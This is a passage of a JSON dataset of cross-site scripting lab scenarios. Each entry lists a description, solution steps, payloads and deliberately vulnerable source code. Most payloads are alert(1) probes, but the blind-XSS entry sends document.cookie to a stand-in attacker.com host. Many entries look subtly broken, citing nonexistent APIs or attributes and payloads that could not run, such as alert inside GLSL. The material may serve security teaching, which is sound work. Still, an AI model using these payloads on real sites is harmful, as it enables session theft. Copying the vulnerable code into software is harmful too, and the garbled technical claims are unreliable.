    "srcCode": "const component = await WebAssembly.compileComponent(userUpload);\ndocument.getElementById('exports').innerHTML = \n  JSON.stringify(component.exports); // Vulnerable"
  },
  {
    "Lab scenario": "CSS Scope XSS in Design System Builder",
    "Lab Description": "UI toolkit implements @scope rules with unsafe selector concatenation. The application allows user-defined scope roots via template literals. To solve: Break style encapsulation to inject global <style> blocks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify scope boundary via DevTools",
      "Craft payload: @scope ([attr^=\"</style><script>\"]) { ... }",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with :has() selector polyfill",
      "Verify through theme preview rendering"
    ],
    "payloads": [
      "@scope (\\3C script\\3E) to (*) { :scope { color: red; } }",
      "[attr^='</style><svg onload=alert(1)>'] { --x: ; }"
    ],
    "srcCode": "const styles = `@scope (${userSelector}) { /* ... */ }`;\ndocument.adoptedStyleSheets = [new CSSStyleSheet().replace(styles)];"
  },
  {
    "Lab scenario": "Import Attributes XSS in Plugin Architecture",
    "Lab Description": "Modular app framework processes dynamic imports with user-controlled assertions. The application uses import(module, { assert }) without validation. To solve: Hijack module loading via crafted type assertions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept import() call via Service Worker",
      "Craft payload: import('./malicious.js', { assert: { type: 'text/html' } })",
      "Bypass MIME checks using import maps fallback",
      "Automate with Playwright module interception",
      "Verify through dependency graph visualization"
    ],
    "payloads": [
      "import('data:text/javascript,alert(1)', {assert:{type:'css'}})",
      "new Worker('data:text/javascript,alert(1)', {type:'module'})"
    ],
    "srcCode": "const module = await import(userPath, \n  JSON.parse(userAssertions)); // Vulnerable"
  },
  {
    "Lab scenario": "Shared Element Transition XSS in Documentation Viewer",
    "Lab Description": "Knowledge base implements view transitions with unsafe pseudo-element naming. The application allows user-controlled viewTransitionName values. To solve: Inject HTML through ::view-transition-group(*) selectors.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify transition targets via Rendering panel",
      "Craft payload: view-transition-name: </style><script>alert(1)</script>",
      "Bypass CSS sanitizer using Unicode escapes",
      "Chain with @starting-style rules",
      "Verify through cross-document transitions"
    ],
    "payloads": [
      "::view-transition-group(\\3C script\\3E) { content: \"\" }",
      "view-transition-name: \\3C script\\3E alert(1)"
    ],
    "srcCode": "document.startViewTransition(() => {\n  document.getElementById('content').style.viewTransitionName = userInput;\n});"
  },
  {
    "Lab scenario": "WebSocket Compression XSS in Real-Time Dashboard",
    "Lab Description": "Monitoring tool implements permessage-deflate with unsafe context takeover. The application processes fragmented messages via innerHTML accumulation. To Solve: Bypass message validation using zlib dictionary poisoning.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WS handshake with Burp Suite",
      "Craft payload: permessage-deflate; client_max_window_bits=15",
      "Bypass fragmentation checks using sliding window reuse",
      "Automate with Python websockets compression API",
      "Verify through metric visualization"
    ],
    "payloads": [
      "0b00001000 0b11111101 0b00000000 (Deflate block with <script>)",
      "ws.send(new Uint8Array([0x3C, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3E]))"
    ],
    "srcCode": "const ws = new WebSocket(url, ['permessage-deflate']);\nws.onmessage = (e) => {\n  outputDiv.innerHTML += await e.data.text(); // Vulnerable\n};"
  },
  {
    "Lab scenario": "WebGPU Shader Storage Buffer XSS in Scientific Visualization",
    "Lab Description": "Molecular visualization tool maps GPU storage buffers to DOM elements without validation. The application uses @compute shaders to process user-uploaded datasets. To solve: Corrupt buffer data to inject HTML payloads via shared memory mapping.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze buffer bindings via WebGPU Inspector",
      "Craft payload: [[group(2), binding(0)]] var<storage> x: array<u32> = [0x3C, 0x73, 0x63];",
      "Bypass bounds checks using variable workgroup sizes",
      "Chain with timestamp occlusion queries",
      "Verify through 3D electron density maps"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "device.createBuffer({ mappedAtCreation: true, usage: GPUBufferUsage.STORAGE }).getMappedRange().set(new TextEncoder().encode('</canvas><script>alert(1)</script>'))",
      "[[stage(compute)]] fn main() { atomicStore(&x[0], 0x3C736372); }"
    ],
    "srcCode": "const buffer = device.createBuffer({ /* User-controlled */ });\ndocument.getElementById('visualization').innerHTML = \n  new TextDecoder().decode(buffer.getMappedRange());"
  },
  {
    "Lab scenario": "HTTP/3 DATAGRAM Frame XSS in Real-Time Sports Analytics",
    "Lab Description": "Player tracking system processes QUIC DATAGRAM frames with unsafe buffer concatenation. The application uses TextDecoderStream without validation for play-by-play updates. To solve: Inject fragmented XSS payloads through connection migration abuse.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft DATAGRAM frames using quiche library",
      "Split payload: 0x3C 0x73 0x63 (first frame), 0x72 0x69 0x70 (second frame)",
      "Bypass flow control using MAX_STREAM_DATA frames",
      "Automate with Cloudflare quiche examples",
      "Verify through live game dashboard"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "quic_send(fd, [0x3C,0x73,0x63,0x72,0x69,0x70,0x74,0x3E])",
      "data:application/datagram;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "quiche_conn_recv_dgram(conn, buf, buf_len, &info);\ndocument.getElementById('stats').innerHTML += \n  new TextDecoder().decode(buf);"
  },
  {
    "Lab scenario": "CSS Math Function XSS in Financial Risk Calculator",
    "Lab Description": "Quantitative analysis tool implements CSS calc() with unsafe var(--user-input) handling. The application allows mathematical expressions in CSSOM via insertRule(). To solve: Break style context through trigonometric function abuse.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CSS injection via Computed Styles panel",
      "Craft payload: --x: sin(</style><svg/onload=alert(1)>);",
      "Bypass sanitizer using env(safe-area-inset-*)",
      "Chain with @property type validation bypass",
      "Verify through PDF report generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "width: calc(var(--x) * 1px + </style><script>alert(1)</script>);",
      "@property --x { syntax: '<string>'; initial-value: \"\\3C script\\3E\" }"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userVars} }`);\ndocument.adoptedStyleSheets.push(sheet);"
  },
  {
    "Lab scenario": "WebCodecs Video Frame XSS in Surveillance System",
    "Lab Description": "Security camera interface processes H.265 streams with unsafe debug overlay rendering. The application injects timestamp metadata into <canvas> via innerHTML. To solve: Achieve XSS through crafted Supplemental Enhancement Information (SEI) messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept video stream using GStreamer",
      "Inject payload: SEI payload_byte[0x3C, 0x73, 0x63, ...]",
      "Bypass frame validation using color subsampling quirks",
      "Chain with WebGL texture uploads",
      "Verify through multi-camera grid view"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "videoFrame.copyTo(new Uint8Array([...'<script>alert(1)</script>']))",
      "timestamp: 0x3C7363726970743E (Hex for <script>)"
    ],
    "srcCode": "const decoder = new VideoDecoder({\n  output: frame => {\n    overlayDiv.innerHTML += `TS: ${frame.timestamp}`; // Vulnerable\n  }\n});"
  },
  {
    "Lab scenario": "ARIA 2.0 Live Region XSS in Social Feed",
    "Lab Description": "Accessibility-first social platform implements ARIA 2.0 live regions with dangerous aria-braille* attribute handling. The application renders notifications via innerHTML without sanitization. To solve: Abuse aria-braillelabel to bypass content security policies.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Trigger high-priority notification via API",
      "Craft payload: <div role=\"status\" aria-braillelabel=\"</div><script>alert(1)</script>\">",
      "Bypass sanitizer using Unicode bidirectional override",
      "Chain with aria-atomic=\"true\"",
      "Verify through screen reader output"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<span role=\"alert\" aria-brailleroledescription=\"<script>\">",
      "<div aria-live=\"polite\" aria-braillelabel=\"\\202E}\\202Ealert(1)//\"></div>"
    ],
    "srcCode": "function showNotification(text) {\n  liveRegion.innerHTML = `<div role=\"alert\">${text}</div>`; // Vulnerable\n}"
  },
  {
    "Lab scenario": "WebAssembly Multi-Memory XSS in Cryptocurrency Wallet",
    "Lab Description": "Blockchain wallet uses WASM multi-memory for transaction signing with unsafe memory mirroring. The application displays raw memory dumps via innerHTML during debug mode. To solve: Corrupt secondary memory instance to inject HTML payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile malicious module with wasm2wat",
      "Craft payload: (memory $xss 1 256) (data (i32.const 0) \"\\3Cscript\\3E\")",
      "Bypass memory isolation using shared-nothing linking",
      "Chain with bulk memory operations",
      "Verify via debug console memory inspection"
    ],
    "payloads": [
      "new WebAssembly.Memory({ initial: 1, maximum: 256 }).buffer.set(new TextEncoder().encode('<script>'))",
      "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
    ],
    "srcCode": "const instance = await WebAssembly.instantiate(wasmBuffer, { env: { mem1, mem2 } });\ndebugConsole.innerHTML = new TextDecoder().decode(mem2.buffer);"
  },
  {
    "Lab scenario": "CSS Anchor Positioning XSS in Legal Document Editor",
    "Lab Description": "Contract drafting tool implements anchor positioning with unsafe grid-area names. The application reflects user input in CSSOM via insertRule(). To solve: Break style context through grid-template-areas injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify grid container via DevTools",
      "Craft payload: grid-template-areas: \"</style><script>alert(1)</script>\"",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with @container style queries",
      "Verify through PDF export rendering"
    ],
    "payloads": [
      "grid-template-areas: \"\\3C script\\3E alert(1) \\3C /script\\3E\"",
      "@container (width: </style><svg/onload=alert(1)>) { ... }"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`#contract { ${userStyles} }`);\ndocument.adoptedStyleSheets.push(sheet);"
  },
  {
    "Lab scenario": "Fetch Metadata Injection in SSO Flow",
    "Lab Description": "Identity provider reflects Sec-Fetch-* headers in error messages without encoding. The application uses innerHTML with server-side header logging. To solve: Bypass fetch metadata validation via request smuggling.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth flow via Burp Suite",
      "Craft payload: Sec-Fetch-Site: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
      "Bypass header normalization using HTTP/2 stream prioritization",
      "Automate with Python requests-h2",
      "Verify through login error page"
    ],
    "payloads": [
      "Sec-Fetch-User: ?1<script>alert(1)</script>",
      "Sec-Fetch-Dest: \"\\u003Cimg/src=x onerror=alert(1)\\u003E\""
    ],
    "srcCode": "app.get('/error', (req, res) => {\n  res.send(`<div>Error: ${req.headers['sec-fetch-site']}</div>`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebHID Gamepad Spoofing XSS in eSports Platform",
    "Lab Description": "Gaming leaderboard processes HID gamepad inputs with unsafe button label rendering. The application maps gamepad.buttons to DOM via innerText with CSS unescape. To solve: Spoof gamepad button labels with XSS payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof gamepad using Teensy microcontroller",
      "Craft payload: \"productName\": \"\\3C script\\3E alert(1)\\u003C /script\\3E\"",
      "Bypass HID report descriptor validation",
      "Automate with WebHID polyfill",
      "Verify through live tournament dashboard"
    ],
    "payloads": [
      "{\"vendorId\":0x1234,\"productId\":0x5678,\"productName\":\"<iframe/src=javascript:alert(1)>\"}",
      "gamepad.buttons[0].label = '</div><svg onload=alert(1)>'"
    ],
    "srcCode": "navigator.hid.requestDevice().then(devices => {\n  document.getElementById('controls').innerText = \n    devices[0].productName; // Vulnerable CSS unescape\n});"
  },
  {
    "Lab scenario": "SVG Filter Primitive XSS in Scientific Visualization",
    "Lab Description": "Research platform implements SVG feDisplacementMap with unsafe scale handling. The application allows user-controlled filter scales via attribute binding. To solve: Inject XSS through filter primitive chaining.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify filter application via Elements panel",
      "Craft payload: <feFuncR tableValues=\"</text><script>alert(1)</script>\"",
      "Bypass CSP using filter composition",
      "Chain with <animate> timing attacks",
      "Verify through vector field rendering"
    ],
    "payloads": [
      "<filter id='x'><feComponentTransfer><feFuncR type='table' tableValues='</script><svg/onload=alert(1)>'/></filter>",
      "<feImage href='data:text/html,<script>alert(1)</script>'/>"
    ],
    "srcCode": "const svg = `<svg>${userFilters}</svg>`;\ndocument.body.insertAdjacentHTML('beforeend', svg); // Vulnerable"
  },
  {
    "Lab scenario": "DOM-based XSS in Banking Portal PDF Generator",
    "Lab Description": "The banking portal generates transaction PDFs using untrusted input in client-side HTML-to-PDF conversion. The application directly inserts user-controlled transaction notes into PDF HTML templates without sanitization. To solve: Execute arbitrary JavaScript when users view generated PDFs in vulnerable browsers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept PDF generation request with Burp Suite and identify injection point in 'comments' parameter",
      "Validate using OWASP ZAP DOM XSS scanner with payload: <img%20src=x%20onerror=console.log(origin)>",
      "Craft SVG payload: <svg/onload=alert(document.cookie)> and encode using UTF-7 charset",
      "Bypass Content-Type restrictions using polyglot HTML/PDF header injection",
      "Verify exploitation by checking browser console for cookie exfiltration"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg/onload=\"alert(1)\">",
      "<img src=x onerror=javascript:alert(document.domain)>",
      "javascript:eval(atob('YWxlcnQoJ2h0dHBzOi8vYXR0YWNrZXItY29tJyk='))"
    ],
    "srcCode": "const generatePDF = (userInput) => {\n  const htmlContent = `<html>\n    <body>\n      ${userInput}\n    </body>\n  </html>`;\n  pdf.create(htmlContent).toBuffer(() => {});\n};"
  },
  {
    "Lab scenario": "Stored XSS in IoT Device Naming Convention",
    "Lab Description": "Smart home dashboard displays device names without output encoding. The application stores user-supplied device names in MongoDB and renders them using innerHTML. To solve: Persistently execute JavaScript when administrators view device management console.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send PUT /api/devices/1 with malicious name payload",
      "Confirm storage via GET request and HTML source inspection",
      "Craft payload using AngularJS sandbox escape: {{constructor.constructor('alert(1)')()}}",
      "Bypass WAF restrictions using UTF-8 encoding and JS template literals",
      "Verify persistence across multiple user sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<img src=x onerror=alert(`XSS`) />",
      "<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</div>",
      "<script>throw onerror=alert,1</script>"
    ],
    "srcCode": "app.post('/devices', (req, res) => {\n  const device = new Device({\n    name: req.body.name // Vulnerable storage\n  });\n  device.save();\n});\n\n// Client-side rendering:\ndocument.getElementById('device-name').innerHTML = deviceName;"
  },
  {
    "Lab scenario": "Mutation XSS in CMS SVG File Processing",
    "Lab Description": "Blog platform allows SVG uploads that are rendered as images. The application fails to sanitize event handlers in SVG foreignObject tags. To solve: Achieve XSS through browser parser inconsistency when rendering malicious SVG.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz SVG upload endpoint with mutation payloads",
      "Validate using Chrome DevTools DOM mutation observer",
      "Craft polyglot payload combining SVG and HTML5 parsing quirks",
      "Bypass CSP restrictions using external script loading via data: URI",
      "Confirm execution across multiple browser engines"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject><body><img src=x onerror=alert(1)></foreignObject></svg>",
      "<svg><script>alert(1)</script></svg>",
      "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
    ],
    "srcCode": "app.post('/upload', (req, res) => {\n  const svgContent = req.files.svg.data.toString();\n  fs.writeFileSync(`uploads/${Date.now()}.svg`, svgContent); // No sanitization\n  res.send('File uploaded');\n});"
  },
  {
    "Lab scenario": "DOM XSS via WebSocket Message Handling",
    "Lab Description": "Real-time chat application processes WebSocket messages with unsafe DOM manipulation. The application directly appends user-controlled message content using innerHTML. To solve: Trigger XSS through crafted WebSocket messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp Suite",
      "Craft message with HTML payload using ws:// connection",
      "Bypass message length restrictions using chunked encoding",
      "Combine with CSRF to force victim browsers to send malicious messages",
      "Verify execution in collaborative chat sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<img src=x: onerror=alert(1)>",
      "<iframe srcdoc=\"<script>alert(1)</script>\">",
      "<math><mtext><option><style><img src=x onerror=alert(1)></style>"
    ],
    "srcCode": "wss.on('connection', (ws) => {\n  ws.on('message', (msg) => {\n    document.getElementById('chat').innerHTML += msg; // Vulnerable\n  });\n});"
  },
  {
    "Lab scenario": "Blind XSS in API Gateway Error Logging",
    "Lab Description": "Microservice API gateway logs User-Agent headers verbatim in admin panel. The application uses unsecured ELK stack for log visualization. To solve: Achieve delayed XSS execution in Kibana interface.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify User-Agent header reflection point using curl testing",
      "Craft payload with delayed callback to attacker server",
      "Bypass header sanitization using HTTP obs-fold techniques",
      "Automate exploitation with Python requests library",
      "Monitor attacker server for successful callbacks"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\"><script>fetch(`https://attacker.com?${document.cookie}`)</script>",
      "javascript:/*--></title></style></textarea></script><svg/onload='alert(1)'>",
      "\" onfocus=alert(1) autofocus=\""
    ],
    "srcCode": "app.use((req, res, next) => {\n  logger.info(`User-Agent: ${req.headers['user-agent']}`); // Vulnerable logging\n  next();\n});\n\n// Admin panel code:\nelasticsearch.search().then(results => {\n  res.render('logs', { logs: results }); // Unsafe rendering\n});"
  },
  {
    "Lab scenario": "Reflected XSS in E-Commerce Search Parameter Wrapping",
    "Lab Description": "Online marketplace search feature wraps user input in <h1> tags without encoding. The application uses Express.js with vulnerable res.send() for AJAX responses. To solve: Execute alert() using angle bracket injection despite server-side replacement filters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify search parameter reflection using Burp Suite's Reflector extension",
      "Bypass tag stripping using JavaScript pseudo-protocol: javascript:alert(1)//%0a",
      "Craft multi-encoding payload: %3Cimg%20src%3Dx%20onerror%3D%26%2397%3Blert%26%2313%3B(1)%3E",
      "Chain with CSP bypass using strict-dynamic nonce reuse",
      "Verify via POST-based reflection in checkout flow"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "</h1><svg/onload=alert`1`>",
      "javascript:alert(document.domain)//%0d",
      "%26%2397;lert()"
    ],
    "srcCode": "app.get('/search', (req, res) => {\n  const query = req.query.q.replace(/</g, '&lt;'); // Incomplete sanitization\n  res.send(`<h1>Results for: ${query}</h1>`);\n});"
  },
  {
    "Lab scenario": "DOM XSS via Healthcare Portal URL Fragment",
    "Lab Description": "Patient records system processes URL fragments in client-side routing. The application uses decodeURIComponent() instead of decodeURI() for fragment parsing. To solve: Achieve XSS through double-encoded hash payloads in SPA routing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze client-side routing with browser's debugger; statement",
      "Craft payload: #<img%2520src=x%2520onerror%2520=%2520alert(1)>",
      "Bypass URL normalization using mixed encoding layers",
      "Combine with history.pushState() to trigger parser differential",
      "Verify using Edge's legacy document mode"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "#<img%20src=x%20onerror=alert(1)>",
      "javascript:eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))",
      "%2522%253E%253Cscript%253Ealert(1)%253C/script%253E"
    ],
    "srcCode": "window.addEventListener('hashchange', () => {\n  const param = decodeURIComponent(location.hash.slice(1));\n  document.getElementById('content').innerHTML = param; // Vulnerable\n});"
  },
  {
    "Lab scenario": "Stored XSS via Social Media Profile JSON-LD Injection",
    "Lab Description": "Platform allows custom profile schemas that render in <script type='application/ld+json'>. The application uses JSON.stringify() without escaping. To solve: Break JSON context and execute script via Unicode escapes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept profile update request with Burp Suite",
      "Craft payload: </script><svg onload=alert(1)>",
      "Bypass JSON validation using escaped line terminators: \\u2028",
      "Combine with CDATA section termination patterns",
      "Verify in mobile app's WebView implementation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\"description\": \"\\u003c/script\\u003e<img src=x onerror=alert(1)>\"",
      "{\"@context\":\"\\u0022</script><script>alert(1)//\"}",
      "\\u002d\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
    ],
    "srcCode": "app.post('/profile', (req, res) => {\n  const schema = `<script type='application/ld+json'>\n    ${JSON.stringify(req.body)}\n  </script>`; // Vulnerable\n  db.updateProfile(schema);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Hotel Booking Calendar Widget",
    "Lab Description": "Date picker component re-encodes HTML entities during DOM cloning. The application uses jQuery's .clone() with broken sanitization. To solve: Achieve XSS through parser differential between clone and innerHTML operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify DOM clobbering vectors using Chrome's Memory tab",
      "Craft payload: <div id=<div id= x='></div><img src=x onerror=alert(1)>'",
      "Bypass jQuery's cleanData() using Object.observe polyfill",
      "Trigger mutation via rapid date selection events",
      "Confirm in Firefox's legacy innerHTML implementation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<x/><style><script>alert(1)</script>",
      "<div id=\"</div><img src=x onerror=alert(1)>\"",
      "<svg><style>{font-family:'</style><script>alert(1)</script>'}"
    ],
    "srcCode": "$('.calendar').on('click', () => {\n  const $clone = $('#template').clone();\n  $clone.html(decodeEntities(userContent)); // Broken sanitization\n  $('body').append($clone);\n});"
  },
  {
    "Lab scenario": "Blind XSS in Fitness Tracker CSV Export",
    "Lab Description": "Workout logging system embeds user input in CSV files using Excel-style formula injection. The application uses res.csv() without proper escaping. To solve: Achieve XSS when admin opens exported file in vulnerable spreadsheet software.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CSV injection point using formula: =1+1",
      "Craft payload: =HYPERLINK(\"javascript:alert(1)\", \"Click\")",
      "Bypass CSV quoting using tab-separated values",
      "Chain with DDE payloads for Office 2016",
      "Verify via file download and LibreOffice rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "=HYPERLINK(\"javascript:alert(document.domain)\",\"Malicious Link\")",
      "@@=1-1=alert(1)-1",
      "=1|'\"&&alert(1)&&'"
    ],
    "srcCode": "app.get('/export', (req, res) => {\n  const csv = userData.map(d => `${d.date},${d.exercise},${d.notes}`).join('\\n');\n  res.csv(csv); // No output encoding\n});"
  },
  {
    "Lab scenario": "XSS via WebAssembly Module Injection in Video Processing App",
    "Lab Description": "Video editing platform dynamically loads WebAssembly modules from user-uploaded files. The application fails to validate imported WASM memory operations. To solve: Achieve arbitrary JavaScript execution through malicious memory pointer manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Reverse-engineer default WASM module using WasmFiddle",
      "Inject malicious memory export: (export \"memory\" (memory $malicious 1 256))",
      "Craft HTML/JS loader exploiting shared ArrayBuffer",
      "Bypass Content Security Policy using wasm-unsafe-eval directive",
      "Verify memory corruption through DevTools Memory Inspector"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "wasmCompile(`(module (memory (export \"memory\") 1 256) (func (export \"exploit\") (i32.store (i32.const 0) (i32.const 0x41414141))))`);",
      "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQBBAn8BQQoAGgAKAA=="
    ],
    "srcCode": "const wasmInstance = await WebAssembly.instantiate(userUploadedBuffer, {\n  env: {\n    memory: new WebAssembly.Memory({ initial: 1 })\n  }\n});\nconsole.log('WASM initialized:', wasmInstance.exports); // Debug logging"
  },
  {
    "Lab scenario": "Shadow DOM XSS Escape in Project Management Dashboard",
    "Lab Description": "Task management system uses closed shadow roots for card descriptions. The application implements broken sanitization through DOMPurify before shadow DOM injection. To solve: Break shadow boundary containment through prototype pollution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify shadow root usage via Chrome's Element Inspector",
      "Craft payload: {constructor: {prototype: {shadowRootAccess: true}}}",
      "Bypass sanitizer using Object.defineProperty() injection",
      "Chain with attachShadow override polyglot",
      "Verify cross-browser compatibility (Chrome/Firefox)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<div id='x'><template shadowroot='open'><slot></slot></template><script>parent.document.write('<img src=x onerror=alert(1)>'</script></div>",
      "{{ Object.defineProperty(Element.prototype, 'shadowRoot', {get: () => document}) }}"
    ],
    "srcCode": "const card = document.createElement('div');\ncard.attachShadow({ mode: 'closed' });\ncard.shadowRoot.innerHTML = sanitize(userInput); // Broken sanitization\nconsole.error('Shadow DOM init failed:', error); // Verbose logging"
  },
  {
    "Lab scenario": "Service Worker Persistent XSS in Progressive Web App",
    "Lab Description": "News aggregator PWA registers service workers from unvalidated user-controlled URLs. The application implements insecure 'serviceworker-allowed' header configuration. To solve: Establish permanent XSS through cached response manipulation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify SW registration endpoint via Network tab",
      "Craft malicious worker: self.addEventListener('fetch', e => e.respondWith(new Response('<script>alert(1)</script>')))",
      "Bypass scope restrictions using path traversal in register()",
      "Automate cache poisoning with OWASP ZAP's SW Fuzzer",
      "Verify persistence across browser restarts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "navigator.serviceWorker.register('/malicious-sw.js', { scope: '/' })",
      "self.importScripts('data:,self.onfetch=()=>new Response(\"<script>alert(1)</script>\")');"
    ],
    "srcCode": "app.get('/register-sw', (req, res) => {\n  const swUrl = req.query.url;\n  res.header('Service-Worker-Allowed', '/');\n  res.json({ url: swUrl }); // Insecure registration\n});"
  },
  {
    "Lab scenario": "WebRTC Data Channel XSS in Telemedicine Platform",
    "Lab Description": "Video conferencing system transmits SDP offers through unescaped DOM updates. The application uses simple-peer with vulnerable SDP parser. To solve: Inject JavaScript through crafted ICE candidate messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture WebRTC handshake using Wireshark",
      "Craft malicious SDP: a=candidate:1 1 udp 2113929216 <img/src=x onerror=alert(1)> 1234",
      "Bypass SDP parser using line wrapping and whitespace",
      "Combine with STUN/TURN server reflection attacks",
      "Verify through peer connection state changes"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "a=ice-ufrag:%3Cscript%3Ealert(1)%3C/script%3E",
      "o=- 0 0 IN IP4 127.0.0.1\ns=<img/src=x onerror=alert(document.domain)>\nt=0 0"
    ],
    "srcCode": "peer.on('signal', data => {\n  document.getElementById('sdp').innerHTML = \n    `SDP: ${JSON.stringify(data)}`; // Vulnerable display\n});"
  },
  {
    "Lab scenario": "PWA Cache Poisoning XSS via Finance Dashboard",
    "Lab Description": "Stock trading PWA caches API responses with vulnerable Cache-Control headers. The application uses stale-while-revalidate strategy without validation. To solve: Poison cache to serve malicious JavaScript from /api/prices endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify cacheable routes via Lighthouse audits",
      "Craft JSONP-style response: )]}',\n{\"data\": \"<script>alert(1)</script>\"}",
      "Bypass MIME type checks using byte-order marks",
      "Automate with Postman Interceptor and cache timing attacks",
      "Verify through offline mode exploitation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: public, max-age=31536000\n\n{\"payload\": \"</script><svg onload=alert(1)>\"}",
      "for(;;);{\"response\": \"<img src=x onerror=alert(document.cookie)>\"}"
    ],
    "srcCode": "self.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request)\n      .then(cached => cached || fetch(event.request))\n  ); // No validation\n});"
  },
  {
    "Lab scenario": "WebGL Shader Injection XSS in AR Platform",
    "Lab Description": "Augmented reality viewer processes 3D model vertex shaders from user uploads. The application converts GLSL code to JS through unsafe eval() optimization. To solve: Achieve JS execution via GLSL preprocessor directives and shader linking.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decompile default shader using WebGL Inspector",
      "Inject payload: #define GL_FRAG_COLOR alert(1);//",
      "Bypass shader validation using OpenGL ES 3.0 quirks",
      "Chain with ANGLE_instanced_arrays extension abuse",
      "Verify through GPU memory dumps"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "#pragma optimize(off)\nprecision highp float;\nvoid main() { discard; alert(1); }",
      "vec4 _main() { return vec4(1.0, webgl_domain, 1.0); }"
    ],
    "srcCode": "const compileShader = (code) => {\n  const optimized = code.replace(/precision\\s+\\w+/g, '');\n  eval(`function shader() { ${optimized} }`); // Debug mode\n};"
  },
  {
    "Lab scenario": "WebSocket Bidirectional XSS in Multiplayer Game Lobby",
    "Lab Description": "Browser-based game uses raw WebSocket.send() for chat and game state. The application mirrors messages between players with vulnerable JSON.parse(JSON.stringify()) pattern. To solve: Achieve XSS through prototype pollution in circular reference handling.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket traffic using Burp Suite's WS Catcher",
      "Craft circular reference payload: {__proto__: {isAdmin: true, toString: ()=>alert(1)}}",
      "Bypass message size limits using DEFLATE compression",
      "Combine with WebSocket permessage-deflate extension",
      "Verify through player state synchronization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
      "JSON.parse('{\"constructor\":{\"prototype\":{\"eval\":\"alert(1)\"}}')"
    ],
    "srcCode": "ws.on('message', (data) => {\n  const parsed = JSON.parse(JSON.stringify(data));\n  broadcast(parsed); // Prototype pollution\n});"
  },
  {
